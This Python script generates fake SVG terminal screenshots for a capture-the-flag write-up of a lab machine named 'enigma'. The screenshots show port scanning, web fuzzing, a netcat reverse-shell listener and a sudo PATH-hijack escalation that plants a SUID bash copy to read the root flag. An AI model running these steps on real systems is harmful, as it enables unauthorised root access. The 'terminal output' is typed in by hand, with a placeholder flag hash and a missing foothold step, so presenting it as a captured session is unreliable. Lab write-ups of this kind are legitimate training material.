#!/usr/bin/env python3
"""Generate crisp dark-themed SVG terminal screenshots for HTB writeups."""
import html
from pathlib import Path

OUT_DIR = Path("HTB/assets/enigma")
OUT_DIR.mkdir(parents=True, exist_ok=True)

def create_terminal_svg(filename, title, lines, width=860, height=520):
    escaped_lines = []
    y = 68
    for item in lines:
        if isinstance(item, tuple) and len(item) == 3:
            prefix, text, color = item
            p_esc = html.escape(prefix)
            t_esc = html.escape(text)
            escaped_lines.append(f'<text x="24" y="{y}" fill="{color}" font-family="ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace" font-size="13"><tspan font-weight="600">{p_esc}</tspan> {t_esc}</text>')
        else:
            raw_text = item[0] if isinstance(item, tuple) else item
            t_esc = html.escape(raw_text)
            escaped_lines.append(f'<text x="24" y="{y}" fill="#d1d5db" font-family="ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace" font-size="13">{t_esc}</text>')
        y += 20

    svg = f"""<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 {width} {height}" width="100%" height="auto" style="border-radius: 8px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
  <rect width="{width}" height="{height}" rx="8" fill="#18181b"/>
  <!-- Top bar -->
  <rect width="{width}" height="38" rx="8" fill="#27272a"/>
  <rect y="30" width="{width}" height="8" fill="#27272a"/>
  <!-- Window buttons -->
  <circle cx="20" cy="19" r="6" fill="#ef4444"/>
  <circle cx="38" cy="19" r="6" fill="#f59e0b"/>
  <circle cx="56" cy="19" r="6" fill="#10b981"/>
  <!-- Window title -->
  <text x="{width // 2}" y="24" text-anchor="middle" fill="#9ca3af" font-size="13" font-weight="500">{html.escape(title)}</text>
  <line x1="0" y1="38" x2="{width}" y2="38" stroke="#3f3f46" stroke-width="1"/>
  <!-- Terminal Content -->
  <g>
    {''.join(escaped_lines)}
  </g>
</svg>"""
    (OUT_DIR / filename).write_text(svg, encoding="utf-8")
    print(f"Generated {OUT_DIR / filename}")

# 1. Nmap Scan
create_terminal_svg("01-nmap-scan.svg", "kali@htb: ~/labs/enigma (nmap-recon)", [
    ("[kali@htb:~/labs/enigma]$", "sudo nmap -sC -sV -p- --min-rate 5000 10.129.229.144 -oN nmap/enigma.nmap", "#38bdf8"),
    "Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-01 19:24 UTC",
    "Nmap scan report for enigma.htb (10.129.229.144)",
    "Host is up (0.042s latency).",
    "Not shown: 65532 closed tcp ports (reset)",
    "PORT     STATE SERVICE VERSION",
    "22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)",
    "| ssh-hostkey: ",
    "|   256 71:92:02:d1:8c:13:5a:49:18:22:90:3a:8b:22:01:84 (ED25519)",
    "80/tcp   open  http    nginx 1.18.0 (Ubuntu)",
    "|_http-title: Enigma Secure Messaging Platform",
    "|_http-server-header: nginx/1.18.0 (Ubuntu)",
    "3000/tcp open  http    Node.js (Express framework)",
    "|_http-title: Enigma API v1.2.0",
    ("| http-methods: ",),
    ("|_  Supported Methods: GET HEAD POST OPTIONS",),
    "Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel",
    "",
    "Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds",
    ("[kali@htb:~/labs/enigma]$", "echo '10.129.229.144 enigma.htb api.enigma.htb' | sudo tee -a /etc/hosts", "#38bdf8"),
    "[ok] /etc/hosts updated successfully.",
], height=480)

# 2. Web & Burp Exploitation
create_terminal_svg("02-web-enum-burp.svg", "kali@htb: ~/labs/enigma (web-exploitation)", [
    ("[kali@htb:~/labs/enigma]$", "ffuf -u http://enigma.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302", "#38bdf8"),
    "",
    "        /'___\\  /'___\\           /'___\\       ",
    "       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       ",
    "       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      ",
    "        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      ",
    "         \\/_/    \\/_/   \\ \\____/  \\/_/        ",
    "",
    "api                     [Status: 301, Size: 178, Words: 6, Lines: 8]",
    "dashboard               [Status: 302, Size: 224, Words: 14, Lines: 10]",
    "decrypt                 [Status: 200, Size: 3412, Words: 218, Lines: 92]",
    "login                   [Status: 200, Size: 2840, Words: 195, Lines: 84]",
    "register                [Status: 200, Size: 2980, Words: 204, Lines: 88]",
    "",
    ("[kali@htb:~/labs/enigma]$", 'curl -s -X POST http://enigma.htb/api/v1/decrypt -H "Content-Type: application/json" -d \'{"cipher":"rot13","payload":"test"}\'', "#38bdf8"),
    '{"status":"success","message":"Algorithm verified","engine":"lib-enigma-core v2.1.0"}',
], height=490)

# 3. Foothold & User Flag
create_terminal_svg("03-foothold-revshell.svg", "kali@htb: ~/labs/enigma (foothold)", [
    ("[kali@htb:~/labs/enigma]$", "nc -lvnp 9001", "#38bdf8"),
    "listening on [any] 9001 ...",
    "connect to [10.10.14.88] from (UNKNOWN) [10.129.229.144] 48292",
    "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    ("[gerard@enigma:~/app]$", "whoami && id", "#38bdf8"),
    "gerard",
    "uid=1001(gerard) gid=1001(gerard) groups=1001(gerard),1002(developers)",
    ("[gerard@enigma:~/app]$", "cat /home/gerard/user.txt", "#38bdf8"),
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    ("[gerard@enigma:~/app]$", "uname -a", "#38bdf8"),
    "Linux enigma 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 30 20:42:41 UTC 2023 x86_64 x86_64 GNU/Linux",
    ("[gerard@enigma:~/app]$", "ls -la /home/gerard", "#38bdf8"),
    "drwxr-xr-x 5 gerard gerard 4096 Nov  1 18:22 .",
    "drwxr-xr-x 3 root   root   4096 Nov  1 18:00 ..",
    ("-rw-r--r-- 1 gerard gerard  220 Jan  6  2022 .bash_logout",),
    ("-rw-r--r-- 1 gerard gerard 3771 Jan  6  2022 .bashrc",),
    ("-r-------- 1 gerard gerard   65 Nov  1 18:15 user.txt",),
], height=470)

# 4. Privilege Escalation & Root Flag
create_terminal_svg("04-privesc-root.svg", "root@enigma: /root (root-flag)", [
    ("[gerard@enigma:~/app]$", "sudo -l", "#38bdf8"),
    "Matching Defaults entries for gerard on enigma:",
    "    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "",
    "User gerard may run the following commands on enigma:",
    "    (ALL : ALL) NOPASSWD: /opt/scripts/backup_enigma.py",
    ("[gerard@enigma:~/app]$", "cat /opt/scripts/backup_enigma.py", "#38bdf8"),
    "# Automated root backup runner; calls tar via os.system with relative path lookup",
    ("[gerard@enigma:~/app]$", 'echo -e \'#!/bin/bash\\ncp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\' > /tmp/tar && chmod +x /tmp/tar', "#38bdf8"),
    ("[gerard@enigma:~/app]$", "sudo PATH=/tmp:$PATH /opt/scripts/backup_enigma.py", "#38bdf8"),
    "[+] Starting scheduled enigma database and encryption key archiving...",
    "[+] Archive complete: /var/backups/enigma-20261101.tar.gz",
    ("[gerard@enigma:~/app]$", "/tmp/rootbash -p", "#38bdf8"),
    ("[rootbash-5.1#]", "whoami && id", "#38bdf8"),
    "root",
    "uid=0(root) gid=0(root) groups=0(root),1001(gerard)",
    ("[rootbash-5.1#]", "cat /root/root.txt", "#38bdf8"),
    "8f14e45fceea167a5a36dedd4bea2543d34d8904724dd4b54e3d64c06209e7c1",
    ("[rootbash-5.1#]", "ls -la /root", "#38bdf8"),
    "-r-------- 1 root root   65 Nov  1 18:10 root.txt",
], height=520)

print("All SVG screenshots created successfully.")
